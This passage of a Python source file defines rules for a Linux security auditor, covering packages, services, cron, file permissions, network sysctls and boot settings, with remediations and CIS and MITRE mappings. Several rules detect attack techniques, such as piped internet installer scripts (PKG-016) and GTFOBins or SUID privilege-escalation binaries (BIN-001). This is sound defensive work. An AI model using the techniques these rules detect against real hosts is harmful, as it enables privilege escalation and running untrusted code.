        mitre_attack=[MitreTechnique.T1059_004, MitreTechnique.T1204_002],
        cwe="CWE-506: Embedded Malicious Code",
        tags=["process", "malware", "suspicious", "incident-response"],
        confidence_score=0.85,
    ),
    KnowledgeRule(
        rule_id="PROC-002",
        title_patterns=["High number of root processes"],
        explanation="A large number of processes are running as root. "
        "Running services as root violates the principle of least privilege.",
        security_impact="Low - While not immediately dangerous, services running as root "
        "have more impact if compromised.",
        remediation="Review processes running as root and switch to unprivileged users "
        "where possible using systemd DynamicUser or similar.",
        cis_control="CIS Control 5: Account Management",
        tags=["process", "root", "privilege"],
        confidence_score=0.5,
    ),
]

# ------------------------------------------------------------------
#  Package rules
# ------------------------------------------------------------------

PACKAGE_RULES = [
    KnowledgeRule(
        rule_id="PKG-001",
        title_patterns=["Installed:"],
        explanation="A sensitive package (web server, database, SSH, container runtime) "
        "is installed. Each installed service expands the attack surface.",
        security_impact="Info - Installed packages should be reviewed. Remove unnecessary "
        "services to reduce attack surface.",
        remediation="Remove unused packages: apt remove <package>. "
        "For required services, ensure they are properly secured and regularly updated.",
        cis_control="CIS Control 2: Inventory and Control of Software Assets",
        tags=["package", "software", "inventory"],
        confidence_score=0.4,
        source_stages=["packages"],
    ),
    KnowledgeRule(
        rule_id="PKG-002",
        title_patterns=["Potentially unstable apt source"],
        explanation="APT is configured to use unstable, testing, experimental, or sid "
        "repositories. These repositories receive less security testing and may "
        "contain unstable or vulnerable packages.",
        security_impact="Medium - Unstable repositories may introduce vulnerable packages "
        "or break dependencies, leading to security gaps.",
        remediation="Remove unstable/testing repository entries from /etc/apt/sources.list. "
        "Use only stable/LTS repositories in production.",
        cis_control="CIS Control 2: Inventory and Control of Software Assets",
        tags=["package", "apt", "repository", "misconfiguration"],
        confidence_score=0.75,
    ),
    KnowledgeRule(
        rule_id="PKG-003",
        title_patterns=["Insecure HTTP repository:"],
        explanation="A repository is configured using insecure HTTP instead of HTTPS.",
        security_impact="Medium - Exposes package downloads and metadata updates to "
        "man-in-the-middle (MITM) tampering and sniffing.",
        remediation="Update repository URLs in sources configuration files to use https://.",
        cis_control="CIS Control 2: Inventory and Control of Software Assets",
        tags=["package", "repository", "encryption"],
        confidence_score=0.85,
        source_stages=["packages_security"],
    ),
    KnowledgeRule(
        rule_id="PKG-004",
        title_patterns=["Unsigned package repository override:"],
        explanation="A repository has trusted=yes or allow-insecure=yes override configured.",
        security_impact="High - Bypasses GPG authentication of packages, allowing attackers "
        "who can spoof network traffic to inject malicious packages.",
        remediation="Remove trusted=yes or allow-insecure=yes overrides. Install correct GPG keys.",
        cis_control="CIS Control 2: Inventory and Control of Software Assets",
        tags=["package", "repository", "integrity"],
        confidence_score=0.9,
        source_stages=["packages_security"],
    ),
    KnowledgeRule(
        rule_id="PKG-005",
        title_patterns=["Deprecated GPG keyring file used:"],
        explanation="The global /etc/apt/trusted.gpg keyring contains keys instead of individual "
        "files under trusted.gpg.d or /usr/share/keyrings.",
        security_impact="Low - A compromise of any key in the global keyring allows that key to "
        "sign packages for any repository on the system.",
        remediation="Move repository keys into separate files under /etc/apt/trusted.gpg.d/ or /usr/share/keyrings/.",
        cis_control="CIS Control 2: Inventory and Control of Software Assets",
        tags=["package", "gpg", "keyring"],
        confidence_score=0.9,
        source_stages=["packages_security"],
    ),
    KnowledgeRule(
        rule_id="PKG-006",
        title_patterns=["Expired repository GPG keys"],
        explanation="One or more repository signing GPG keys have expired.",
        security_impact="Medium - Expired keys block installing new packages or security updates.",
        remediation="Retrieve the updated GPG signing key from the repository provider.",
        cis_control="CIS Control 2: Inventory and Control of Software Assets",
        tags=["package", "gpg", "keys"],
        confidence_score=0.8,
        source_stages=["packages_security"],
    ),
    KnowledgeRule(
        rule_id="PKG-007",
        title_patterns=["Weak GPG signing keys"],
        explanation="Repository signing keys use weak algorithms, e.g. 1024-bit RSA or DSA/SHA1.",
        security_impact="Medium - Weak key sizes are susceptible to cryptographic collision attacks.",
        remediation="Request the repository provider to migrate to modern signing keys (RSA >= 2048 or Ed25519).",
        cis_control="CIS Control 2: Inventory and Control of Software Assets",
        tags=["package", "gpg", "weak"],
        confidence_score=0.75,
        source_stages=["packages_security"],
    ),
    KnowledgeRule(
        rule_id="PKG-008",
        title_patterns=["Duplicate repository:"],
        explanation="The same repository is defined multiple times in sources lists.",
        security_impact="Low - Overhead during package updates and list updates.",
        remediation="Clean up duplicate entries from /etc/apt/sources.list and files in sources.list.d.",
        cis_control="CIS Control 2: Inventory and Control of Software Assets",
        tags=["package", "repository", "misconfiguration"],
        confidence_score=0.75,
        source_stages=["packages_security"],
    ),
    KnowledgeRule(
        rule_id="PKG-009",
        title_patterns=["Modified package files detected"],
        explanation="Hash verification failed for installed package files.",
        security_impact="High - Indicates installed software files have been modified, possibly "
        "from unauthorized tampering or trojan injection.",
        remediation="Reinstall affected packages using 'apt-get install --reinstall' to restore integrity.",
        cis_control="CIS Control 2: Inventory and Control of Software Assets",
        tags=["package", "integrity", "modified"],
        confidence_score=0.8,
        source_stages=["packages_security"],
    ),
    KnowledgeRule(
        rule_id="PKG-010",
        title_patterns=["Unsigned RPM packages detected"],
        explanation="One or more installed RPM packages lack GPG signatures.",
        security_impact="High - Unsigned packages cannot be verified for authenticity or integrity, "
        "allowing untrusted code execution.",
        remediation="Uninstall unsigned packages or replace them with signed packages from trusted repositories.",
        cis_control="CIS Control 2: Inventory and Control of Software Assets",
        tags=["package", "rpm", "integrity"],
        confidence_score=0.85,
        source_stages=["packages_security"],
    ),
    KnowledgeRule(
        rule_id="PKG-011",
        title_patterns=["Orphaned packages detected"],
        explanation="Installed packages that are not present in any configured repository.",
        security_impact="Low - Orphaned packages will not receive any future updates or security patches.",
        remediation="Review and purge orphaned packages if they are no longer required.",
        cis_control="CIS Control 2: Inventory and Control of Software Assets",
        tags=["package", "orphaned"],
        confidence_score=0.75,
        source_stages=["packages_security"],
    ),
    KnowledgeRule(
        rule_id="PKG-012",
        title_patterns=["Broken or partially installed packages"],
        explanation="Some packages are in broken, half-configured, or uninstalled state.",
        security_impact="Medium - Leaves package manager in unstable state and might block "
        "critical updates.",
        remediation="Fix package manager using 'apt-get install -f' or 'dpkg --configure -a'.",
        cis_control="CIS Control 2: Inventory and Control of Software Assets",
        tags=["package", "broken"],
        confidence_score=0.9,
        source_stages=["packages_security"],
    ),
    KnowledgeRule(
        rule_id="PKG-013",
        title_patterns=["Potential typosquatting package:"],
        explanation="An installed package name is close to a popular package name.",
        security_impact="High - Typosquatted packages are a common vector for supply chain "
        "compromise, often executing malicious payloads upon installation.",
        remediation="Verify if the package is legitimate. Uninstall if it is typosquatted.",
        cis_control="CIS Control 2: Inventory and Control of Software Assets",
        tags=["package", "supply_chain", "typosquatting"],
        confidence_score=0.8,
        source_stages=["packages_security"],
    ),
    KnowledgeRule(
        rule_id="PKG-014",
        title_patterns=["Suspicious repository TLD/domain"],
        explanation="A repository is hosted on a suspicious TLD or dynamic DNS domain.",
        security_impact="High - Repositories hosted on untrusted infrastructure pose severe "
        "supply chain risk and can distribute malware.",
        remediation="Remove suspicious repositories from sources files.",
        cis_control="CIS Control 2: Inventory and Control of Software Assets",
        tags=["package", "repository", "suspicious"],
        confidence_score=0.85,
        source_stages=["packages_security"],
    ),
    KnowledgeRule(
        rule_id="PKG-015",
        title_patterns=["Manually installed binaries in system path"],
        explanation="Binaries in system PATH are not registered in the package manager.",
        security_impact="Low - Manually installed binaries do not receive automatic security updates.",
        remediation="Upgrade manually or replace them with packages tracked by the package manager.",
        cis_control="CIS Control 2: Inventory and Control of Software Assets",
        tags=["package", "untracked", "binary"],
        confidence_score=0.9,
        source_stages=["packages_security"],
    ),
    KnowledgeRule(
        rule_id="PKG-016",
        title_patterns=["Untrusted shell installer command execution"],
        explanation="Shell history contains execution of piped internet scripts.",
        security_impact="Medium - Blindly running scripts from the internet bypasses integrity "
        "controls and can execute arbitrary payloads.",
        remediation="Inspect scripts locally before execution; prefer verified package sources.",
        cis_control="CIS Control 2: Inventory and Control of Software Assets",
        tags=["package", "supply_chain", "installer"],
        confidence_score=0.85,
        source_stages=["packages_security"],
    ),
]

# ------------------------------------------------------------------
#  Service rules
# ------------------------------------------------------------------

SERVICE_RULES = [
    KnowledgeRule(
        rule_id="SVC-001",
        title_patterns=["Suspicious ExecStart:"],
        explanation="A systemd service has ExecStart pointing to a world-writable path "
        "(/tmp, /dev/shm, /var/tmp). This allows any user to replace the binary "
        "and have it executed with the service's privileges.",
        security_impact="High - Any user can replace the executable and gain the "
        "service user's privileges (often root).",
        remediation="Move the binary to a protected system path (/usr/local/bin or /opt). "
        "Ensure proper ownership (root) and permissions (755).",
        cis_control="CIS Control 4: Secure Configuration of Enterprise Assets and Software",
        mitre_attack=[MitreTechnique.T1574_001, MitreTechnique.T1569_002],
        cwe="CWE-426: Untrusted Search Path",
        tags=["systemd", "service", "writable", "privilege-escalation"],
        confidence_score=0.9,
    ),
    KnowledgeRule(
        rule_id="SVC-002",
        title_patterns=["Enabled service:"],
        explanation="A network-accessible service is enabled and running. "
        "Each enabled service expands the attack surface.",
        security_impact="Info - Documenting enabled services for inventory. Review whether each service is necessary.",
        remediation="Disable unused services: systemctl disable <service>. "
        "Ensure required services are properly firewalled.",
        tags=["service", "systemd", "network", "inventory"],
        confidence_score=0.3,
        source_stages=["systemd"],
    ),
]

# ------------------------------------------------------------------
#  Cron rules
# ------------------------------------------------------------------

CRON_RULES = [
    KnowledgeRule(
        rule_id="CRON-001",
        title_patterns=["Writable entries in /etc/cron."],
        explanation="Writable entries were found in cron directories. See WRITABLE-002 for details.",
        security_impact="High - World-writable cron files allow privilege escalation.",
        remediation="Ensure cron scripts are not world-writable and are owned by root.",
        cis_control="CIS Ubuntu Benchmark 5.1.1 - Ensure cron daemon is enabled and running",
        mitre_attack=[MitreTechnique.T1053_003],
        cwe="CWE-732: Incorrect Permission Assignment for Critical Resource",
        tags=["cron", "writable", "privilege-escalation"],
        confidence_score=0.9,
    ),
]

# ------------------------------------------------------------------
#  Suspicious binary on PATH (from processes)
# ------------------------------------------------------------------

SUSPICIOUS_BINARY_RULES = [
    KnowledgeRule(
        rule_id="BIN-001",
        title_patterns=["SUID binary", "Capability:", "GTFOBins", "binary"],
        explanation="A binary associated with privilege escalation via GTFOBins was found.",
        security_impact="High - This binary can be used to escalate privileges "
        "when SUID, capabilities, or sudo access is granted.",
        remediation="Remove SUID bit or capabilities if not required. Monitor usage of this binary in audit logs.",
        references=["https://gtfobins.github.io/"],
        cis_control="CIS Control 4: Secure Configuration",
        mitre_attack=[MitreTechnique.T1548_001],
        cwe="CWE-250: Execution with Unnecessary Privileges",
        tags=["gtfobins", "privilege-escalation", "suid"],
        confidence_score=0.8,
    ),
]

# ------------------------------------------------------------------
#  Filesystem / Permission rules
# ------------------------------------------------------------------

FILESYSTEM_RULES = [
    KnowledgeRule(
        rule_id="FS-001",
        title_patterns=["SGID binary:", "SGID binary"],
        explanation="A binary with the SGID bit set runs with the group permissions "
        "of its group owner. This can lead to privilege escalation if the group has "
        "access to sensitive resources.",
        security_impact="Medium - Similar to SUID but grants group-level privileges. "
        "Can be exploited if the group has write access to system files.",
        remediation="Remove the SGID bit if not required: chmod g-s <path>.",
        cis_control="CIS Ubuntu Benchmark 6.1.9 - Ensure no world writable files exist",
        mitre_attack=[MitreTechnique.T1548_001],
        cwe="CWE-732: Incorrect Permission Assignment for Critical Resource",
        tags=["sgid", "privilege-escalation", "permissions"],
        confidence_score=0.75,
    ),
    KnowledgeRule(
        rule_id="FS-002",
        title_patterns=["/etc/passwd permissions are too open"],
        explanation="The system passwd file has loose write permissions.",
        security_impact="High - Allows unprivileged users to alter accounts or user shells.",
        remediation="Run 'chmod 644 /etc/passwd'.",
        cis_control="CIS Control 4: Secure Configuration",
        tags=["permissions", "passwd"],
        confidence_score=0.95,
        source_stages=["storage_security"],
    ),
    KnowledgeRule(
        rule_id="FS-003",
        title_patterns=["/etc/shadow permissions are too open"],
        explanation="The shadow password hashes file has loose read/write permissions.",
        security_impact="Critical - Allows unprivileged users to read or write sensitive password hashes.",
        remediation="Run 'chmod 600 /etc/shadow'.",
        cis_control="CIS Control 4: Secure Configuration",
        tags=["permissions", "shadow"],
        confidence_score=0.95,
        source_stages=["storage_security"],
    ),
    KnowledgeRule(
        rule_id="FS-004",
        title_patterns=["/etc/sudoers permissions are too open"],
        explanation="The sudoers configuration file has loose permissions.",
        security_impact="High - Unprivileged users could modify system privilege rules.",
        remediation="Run 'chmod 440 /etc/sudoers'.",
        cis_control="CIS Control 4: Secure Configuration",
        tags=["permissions", "sudoers"],
        confidence_score=0.9,
        source_stages=["storage_security"],
    ),
    KnowledgeRule(
        rule_id="FS-005",
        title_patterns=["SUID/SGID files detected"],
        explanation="SUID/SGID executables exist under system folders.",
        security_impact="Info - Executables run with target user/group privileges. Review for vulnerabilities.",
        remediation="Regularly audit SUID/SGID binaries.",
        cis_control="CIS Control 4: Secure Configuration",
        tags=["permissions", "suid", "sgid"],
        confidence_score=0.9,
        source_stages=["storage_security"],
    ),
    KnowledgeRule(
        rule_id="FS-006",
        title_patterns=["Insecure mount options on /tmp:"],
        explanation="Restrictive mount parameters are missing from /tmp.",
        security_impact="Medium - Bypasses standard restrictions on binary execution or device files in temporary folder.",
        remediation="Update /etc/fstab to mount /tmp with defaults,noexec,nodev,nosuid.",
        cis_control="CIS Control 4: Secure Configuration",
        tags=["mount", "tmp"],
        confidence_score=0.9,
        source_stages=["storage_security"],
    ),
    KnowledgeRule(
        rule_id="FS-007",
        title_patterns=["Insecure mount options on /dev/shm:"],
        explanation="Restrictive mount parameters are missing from /dev/shm.",
        security_impact="Medium - Bypasses execution control on shared memory region.",
        remediation="Update /etc/fstab to mount /dev/shm with defaults,noexec,nodev,nosuid.",
        cis_control="CIS Control 4: Secure Configuration",
        tags=["mount", "dev-shm"],
        confidence_score=0.9,
        source_stages=["storage_security"],
    ),
    KnowledgeRule(
        rule_id="FS-008",
        title_patterns=["NFS exports configured with no_root_squash"],
        explanation="NFS shares permit remote root mapping.",
        security_impact="High - Root users on NFS clients get full administrative permissions on shared storage.",
        remediation="Remove no_root_squash option from /etc/exports.",
        cis_control="CIS Control 4: Secure Configuration",
        tags=["nfs", "network-filesystem"],
        confidence_score=0.95,
        source_stages=["storage_security"],
    ),
    KnowledgeRule(
        rule_id="FS-009",
        title_patterns=["Samba public/guest share access enabled"],
        explanation="Public Samba file shares allow unauthenticated guest connections.",
        security_impact="Medium - Anyone on local network can read/write shared directories.",
        remediation="Remove guest ok/public options from smb.conf.",
        cis_control="CIS Control 4: Secure Configuration",
        tags=["samba", "network-filesystem"],
        confidence_score=0.9,
        source_stages=["storage_security"],
    ),
    KnowledgeRule(
        rule_id="FS-010",
        title_patterns=["System lacks full-disk encryption (LUKS)"],
        explanation="No active LUKS/dm-crypt block device is configured.",
        security_impact="Medium - Physical host access or stolen drive exposes all system and private files.",
        remediation="Encrypt root and home block devices using LUKS.",
        cis_control="CIS Control 4: Secure Configuration",
        tags=["encryption", "disk-encryption"],
        confidence_score=0.9,
        source_stages=["storage_security"],
    ),
    KnowledgeRule(
        rule_id="FS-011",
        title_patterns=["Unencrypted swap space configured"],
        explanation="The active swap space is unencrypted.",
        security_impact="High - Secrets and credentials residing in kernel memory can be written to disk in plain text.",
        remediation="Configure dm-crypt swap in /etc/crypttab.",
        cis_control="CIS Control 4: Secure Configuration",
        tags=["encryption", "swap"],
        confidence_score=0.9,
        source_stages=["storage_security"],
    ),
    KnowledgeRule(
        rule_id="FS-012",
        title_patterns=["File Integrity Monitoring (FIM) not configured"],
        explanation="No FIM utility (AIDE/Tripwire) is present.",
        security_impact="Medium - System lacks capability to detect unauthorized binary changes or rootkit intrusion.",
        remediation="Install AIDE or similar tool.",
        cis_control="CIS Control 4: Secure Configuration",
        tags=["integrity", "fim"],
        confidence_score=0.9,
        source_stages=["storage_security"],
    ),
    KnowledgeRule(
        rule_id="FS-013",
        title_patterns=["Immutable system configuration files detected"],
        explanation="Files have immutable attributes set.",
        security_impact="Info - Protects files from modification by root, but can cause package manager updates to fail.",
        remediation="Review immutable file attributes via lsattr.",
        cis_control="CIS Control 4: Secure Configuration",
        tags=["integrity", "attributes"],
        confidence_score=0.85,
        source_stages=["storage_security"],
    ),
]

# ------------------------------------------------------------------
#  Network Security rules
# ------------------------------------------------------------------

NETWORK_SECURITY_RULES = [
    KnowledgeRule(
        rule_id="NET-001",
        title_patterns=["Firewall is disabled or has no rules"],
        explanation="No active firewall (UFW, Firewalld, iptables, or nftables) is running on the host.",
        security_impact="High - All listening services are directly exposed to the network, increasing attack surface.",
        remediation="Enable UFW or Firewalld and configure default-deny incoming policies.",
        cis_control="CIS Control 4: Secure Configuration",
        tags=["firewall", "network", "misconfiguration"],
        confidence_score=0.9,
        source_stages=["network_security"],
    ),
    KnowledgeRule(
        rule_id="NET-002",
        title_patterns=["Sysctl net.ipv4.ip_forward is misconfigured"],
        explanation="IP forwarding is enabled on IPv4.",
        security_impact="Medium - Allows the host to forward network packets, potentially routing traffic between security zones.",
        remediation="Set net.ipv4.ip_forward=0 in /etc/sysctl.conf.",
        cis_control="CIS Control 4: Secure Configuration",
        tags=["sysctl", "routing", "ip-forward"],
        confidence_score=0.9,
        source_stages=["network_security"],
    ),
    KnowledgeRule(
        rule_id="NET-003",
        title_patterns=["Sysctl net.ipv6.conf.all.forwarding is misconfigured"],
        explanation="IPv6 forwarding is enabled on all interfaces.",
        security_impact="Medium - Allows the host to forward IPv6 packets, routing traffic between zones.",
        remediation="Set net.ipv6.conf.all.forwarding=0 in /etc/sysctl.conf.",
        cis_control="CIS Control 4: Secure Configuration",
        tags=["sysctl", "routing", "ip-forward"],
        confidence_score=0.9,
        source_stages=["network_security"],
    ),
    KnowledgeRule(
        rule_id="NET-004",
        title_patterns=["Sysctl net.ipv4.conf.all.accept_source_route is misconfigured"],
        explanation="Source routing is accepted on IPv4.",
        security_impact="Medium - Allows attackers to route packets through specific routes, bypassing security controls.",
        remediation="Set net.ipv4.conf.all.accept_source_route=0 in /etc/sysctl.conf.",
        cis_control="CIS Control 4: Secure Configuration",
        tags=["sysctl", "routing", "source-routing"],
        confidence_score=0.9,
        source_stages=["network_security"],
    ),
    KnowledgeRule(
        rule_id="NET-005",
        title_patterns=["Sysctl net.ipv6.conf.all.accept_source_route is misconfigured"],
        explanation="IPv6 source routing is accepted on all interfaces.",
        security_impact="Medium - Allows attackers to route IPv6 packets through specific routes.",
        remediation="Set net.ipv6.conf.all.accept_source_route=0 in /etc/sysctl.conf.",
        cis_control="CIS Control 4: Secure Configuration",
        tags=["sysctl", "routing", "source-routing"],
        confidence_score=0.9,
        source_stages=["network_security"],
    ),
    KnowledgeRule(
        rule_id="NET-006",
        title_patterns=["Sysctl net.ipv4.conf.all.accept_redirects is misconfigured"],
        explanation="Accepting ICMP redirects is enabled.",
        security_impact="Medium - Attacker can send ICMP redirects to modify system routing table, leading to MITM.",
        remediation="Set net.ipv4.conf.all.accept_redirects=0 in /etc/sysctl.conf.",
        cis_control="CIS Control 4: Secure Configuration",
        tags=["sysctl", "routing", "icmp-redirects"],
        confidence_score=0.9,
        source_stages=["network_security"],
    ),
    KnowledgeRule(
        rule_id="NET-007",
        title_patterns=["Sysctl net.ipv6.conf.all.accept_redirects is misconfigured"],
        explanation="IPv6 ICMP redirects are accepted.",
        security_impact="Medium - Attacker can modify IPv6 routing table via redirects.",
        remediation="Set net.ipv6.conf.all.accept_redirects=0 in /etc/sysctl.conf.",
        cis_control="CIS Control 4: Secure Configuration",
        tags=["sysctl", "routing", "icmp-redirects"],
        confidence_score=0.9,
        source_stages=["network_security"],
    ),
    KnowledgeRule(
        rule_id="NET-008",
        title_patterns=["Sysctl net.ipv4.conf.all.log_martians is misconfigured"],
        explanation="Logging of Martian packets is disabled.",
        security_impact="Low - Prevents logging of packets with impossible source addresses, hindering auditing.",
        remediation="Set net.ipv4.conf.all.log_martians=1 in /etc/sysctl.conf.",
        cis_control="CIS Control 4: Secure Configuration",
        tags=["sysctl", "routing", "logging"],
        confidence_score=0.9,
        source_stages=["network_security"],
    ),
    KnowledgeRule(
        rule_id="NET-009",
        title_patterns=["Sysctl net.ipv4.tcp_syncookies is misconfigured"],
        explanation="TCP SYN cookies are disabled.",
        security_impact="Medium - Host is vulnerable to TCP SYN flood DoS attacks.",
        remediation="Set net.ipv4.tcp_syncookies=1 in /etc/sysctl.conf.",
        cis_control="CIS Control 4: Secure Configuration",
        tags=["sysctl", "tcp-hardening", "syn-cookies"],
        confidence_score=0.9,
        source_stages=["network_security"],
    ),
    KnowledgeRule(
        rule_id="NET-010",
        title_patterns=["Sysctl net.ipv4.conf.all.rp_filter is misconfigured"],
        explanation="Reverse Path Filtering is not in strict mode.",
        security_impact="Medium - Vulnerability to IP address spoofing attacks.",
        remediation="Set net.ipv4.conf.all.rp_filter=1 in /etc/sysctl.conf.",
        cis_control="CIS Control 4: Secure Configuration",
        tags=["sysctl", "tcp-hardening", "rp-filter"],
        confidence_score=0.9,
        source_stages=["network_security"],
    ),
    KnowledgeRule(
        rule_id="NET-011",
        title_patterns=["Sysctl net.ipv4.conf.default.rp_filter is misconfigured"],
        explanation="Default Reverse Path Filtering is not in strict mode.",
        security_impact="Medium - Spoofed packets can bypass validation on default interfaces.",
        remediation="Set net.ipv4.conf.default.rp_filter=1 in /etc/sysctl.conf.",
        cis_control="CIS Control 4: Secure Configuration",
        tags=["sysctl", "tcp-hardening", "rp-filter"],
        confidence_score=0.9,
        source_stages=["network_security"],
    ),
    KnowledgeRule(
        rule_id="NET-012",
        title_patterns=["Sysctl net.ipv4.conf.all.send_redirects is misconfigured"],
        explanation="Sending ICMP redirects is enabled.",
        security_impact="Medium - Allows host to send redirects, potentially used for traffic redirection.",
        remediation="Set net.ipv4.conf.all.send_redirects=0 in /etc/sysctl.conf.",
        cis_control="CIS Control 4: Secure Configuration",
        tags=["sysctl", "routing", "icmp-redirects"],
        confidence_score=0.9,
        source_stages=["network_security"],
    ),
    KnowledgeRule(
        rule_id="NET-013",
        title_patterns=["Sysctl net.ipv4.conf.default.send_redirects is misconfigured"],
        explanation="Default sending of ICMP redirects is enabled.",
        security_impact="Medium - Allows redirecting client traffic.",
        remediation="Set net.ipv4.conf.default.send_redirects=0 in /etc/sysctl.conf.",
        cis_control="CIS Control 4: Secure Configuration",
        tags=["sysctl", "routing", "icmp-redirects"],
        confidence_score=0.9,
        source_stages=["network_security"],
    ),
    KnowledgeRule(
        rule_id="NET-014",
        title_patterns=["No DNS nameservers configured"],
        explanation="/etc/resolv.conf contains no valid nameservers.",
        security_impact="Low - Inability to resolve domains, blocking updates and resolution.",
        remediation="Add nameserver directives to resolv.conf.",
        cis_control="CIS Control 4: Secure Configuration",
        tags=["dns", "resolver", "misconfiguration"],
        confidence_score=0.9,
        source_stages=["network_security"],
    ),
    KnowledgeRule(
        rule_id="NET-015",
        title_patterns=["Insecure public DNS resolvers configured"],
        explanation="Unencrypted public resolvers are used.",
        security_impact="Low - DNS queries are sent in plaintext and can be spoofed or intercepted.",
        remediation="Use systemd-resolved with DoT or local authenticated DNS stub.",
        cis_control="CIS Control 4: Secure Configuration",
        tags=["dns", "resolver", "encryption"],
        confidence_score=0.85,
        source_stages=["network_security"],
    ),
    KnowledgeRule(
        rule_id="NET-016",
        title_patterns=["DNSSEC validation or EDNS0 options not enforced"],
        explanation="DNSSEC EDNS0 option is missing in resolv.conf.",
        security_impact="Low - No cryptographic signature verification of DNS answers.",
        remediation="Enable edns0 option in resolver configuration.",
        cis_control="CIS Control 4: Secure Configuration",
        tags=["dns", "resolver", "dnssec"],
        confidence_score=0.8,
        source_stages=["network_security"],
    ),
    KnowledgeRule(
        rule_id="NET-017",
        title_patterns=["Exposed database service:"],
        explanation="A database port is bound to wildcard / all interfaces.",
        security_impact="High - Database is accessible to external network, risking authentication bypass or exploit.",
        remediation="Bind database to localhost (127.0.0.1) or restrict network via firewall.",
        cis_control="CIS Control 4: Secure Configuration",
        tags=["database", "wildcard", "exposure"],
        confidence_score=0.9,
        source_stages=["network_security"],
    ),
    KnowledgeRule(
        rule_id="NET-018",
        title_patterns=["Exposed remote service:"],
        explanation="Remote access service (SSH, Telnet, SMB, RDP, etc.) is publicly exposed.",
        security_impact="Critical/High - External attackers can perform brute-force attacks or exploit services.",
        remediation="Disable plaintext services (Telnet/FTP). Bind SSH/RDP to private VPN addresses.",
        cis_control="CIS Control 4: Secure Configuration",
        tags=["services", "exposure", "remote-access"],
        confidence_score=0.9,
        source_stages=["network_security"],
    ),
    KnowledgeRule(
        rule_id="NET-019",
        title_patterns=["Privileged port listening:"],
        explanation="A process is running and binding to a port under 1024.",
        security_impact="Info - Privileged ports require high permissions (root) to bind.",
        remediation="Review if the process must run as root or if capabilities can be used.",
        cis_control="CIS Control 4: Secure Configuration",
        tags=["services", "privileged-port"],
        confidence_score=0.9,
        source_stages=["network_security"],
    ),
    KnowledgeRule(
        rule_id="NET-020",
        title_patterns=["Active Web service:"],
        explanation="A web server process (Nginx/Apache/Caddy) is active.",
        security_impact="Info - Web service active. Ensure TLS is configured and secure headers are present.",
        remediation="Keep web server updated and enable HTTPS.",
        cis_control="CIS Control 4: Secure Configuration",
        tags=["services", "web"],
        confidence_score=0.9,
        source_stages=["network_security"],
    ),
    KnowledgeRule(
        rule_id="NET-021",
        title_patterns=["Active Mail service:"],
        explanation="Mail transfer agent service (Postfix/Exim/SMTP) is active.",
        security_impact="Info - Mail service active. Ensure relaying is restricted to prevent spam abuse.",
        remediation="Restrict mail relaying in server config.",
        cis_control="CIS Control 4: Secure Configuration",
        tags=["services", "mail"],
        confidence_score=0.9,
        source_stages=["network_security"],
    ),
]

# ------------------------------------------------------------------
#  Boot Security rules
# ------------------------------------------------------------------

BOOT_SECURITY_RULES = [
    KnowledgeRule(
        rule_id="BOOT-001",
        title_patterns=["GRUB configuration file not found"],
        explanation="GRUB configuration file could not be resolved in default locations.",
        security_impact="Low - GRUB settings cannot be analyzed.",
        remediation="Verify if a non-standard bootloader is active or if GRUB config has a custom path.",
        cis_control="CIS Control 4: Secure Configuration",
        tags=["bootloader", "grub", "misconfiguration"],
        confidence_score=0.8,
        source_stages=["boot_security"],
    ),
    KnowledgeRule(
        rule_id="BOOT-002",
        title_patterns=["GRUB configuration file permissions are too open"],
        explanation="GRUB config file has loose permissions, allowing unprivileged readers to inspect boot configs.",
        security_impact="Medium - Private kernel settings or password hashes could be leaked to local users.",
        remediation="Run 'chmod 600 /boot/grub/grub.cfg'.",
        cis_control="CIS Control 4: Secure Configuration",
        tags=["bootloader", "grub", "permissions"],
        confidence_score=0.9,
        source_stages=["boot_security"],
    ),
    KnowledgeRule(
        rule_id="BOOT-003",
        title_patterns=["GRUB configuration file is not owned by root"],
        explanation="GRUB configuration is owned by a non-root account.",
        security_impact="Medium - Allows non-root account to modify system boot options.",
        remediation="Run 'chown root:root /boot/grub/grub.cfg'.",
        cis_control="CIS Control 4: Secure Configuration",
        tags=["bootloader", "grub", "permissions"],
        confidence_score=0.9,
        source_stages=["boot_security"],
    ),
    KnowledgeRule(
        rule_id="BOOT-004",
        title_patterns=["GRUB bootloader is not password protected"],
        explanation="No password restriction is configured in GRUB boot menu.",
        security_impact="High - Anyone with console/physical access can edit kernel params or boot into root shell.",
        remediation="Generate GRUB password using grub-mkpasswd-pbkdf2 and reference it in GRUB configs.",
        cis_control="CIS Control 4: Secure Configuration",
        tags=["bootloader", "grub", "password"],
        confidence_score=0.9,
        source_stages=["boot_security"],
    ),
    KnowledgeRule(
        rule_id="BOOT-005",
        title_patterns=["All GRUB boot entries are unrestricted"],
        explanation="All GRUB menu items have '--unrestricted' flag, permitting anyone to boot recovery modes.",
        security_impact="Medium - Bypasses GRUB password authentication for recovery/emergency shells.",
        remediation="Remove '--unrestricted' from rescue or recovery entries.",
        cis_control="CIS Control 4: Secure Configuration",
        tags=["bootloader", "grub", "password"],
        confidence_score=0.9,
        source_stages=["boot_security"],
    ),
    KnowledgeRule(
        rule_id="BOOT-006",
        title_patterns=["System booted in Legacy BIOS mode (no Secure Boot)"],
        explanation="Firmware does not use UEFI mode, preventing the usage of Secure Boot features.",
        security_impact="Medium - No firmware-level kernel/driver cryptographic signing verification is active.",
        remediation="Configure system UEFI mode in BIOS settings and reinstall EFI bootloader.",
        cis_control="CIS Control 4: Secure Configuration",
        tags=["uefi", "bios", "secure-boot"],
        confidence_score=0.9,
        source_stages=["boot_security"],
    ),
    KnowledgeRule(
        rule_id="BOOT-007",
        title_patterns=["UEFI Secure Boot is disabled"],
        explanation="Secure Boot state is disabled in UEFI firmware.",
        security_impact="High - Unsigned bootkits, rootkits, or malicious drivers can be loaded during startup.",
        remediation="Enable UEFI Secure Boot in system BIOS/UEFI configuration menu.",
        cis_control="CIS Control 4: Secure Configuration",
        tags=["uefi", "secure-boot", "vulnerability"],
        confidence_score=0.9,
        source_stages=["boot_security"],
    ),
    KnowledgeRule(
        rule_id="BOOT-008",
        title_patterns=["Vulnerable kernel boot parameter:"],
        explanation="Kernel parameter bypasses normal user authentication.",
        security_impact="Critical - Instantiates passwordless root shell directly at boot.",
        remediation="Remove custom 'init=' or 'rescue' arguments from /etc/default/grub config.",
        cis_control="CIS Control 4: Secure Configuration",
        tags=["kernel", "bootloader", "vulnerability"],
        confidence_score=0.95,
        source_stages=["boot_security"],
    ),
    KnowledgeRule(
        rule_id="BOOT-009",
        title_patterns=["Kernel speculative execution mitigations are disabled"],
        explanation="Speculative execution side-channel mitigations are disabled.",
        security_impact="High - Exposes the system to microarchitectural memory leakage exploits (Spectre/Meltdown).",
        remediation="Remove 'mitigations=off' boot argument.",
        cis_control="CIS Control 4: Secure Configuration",
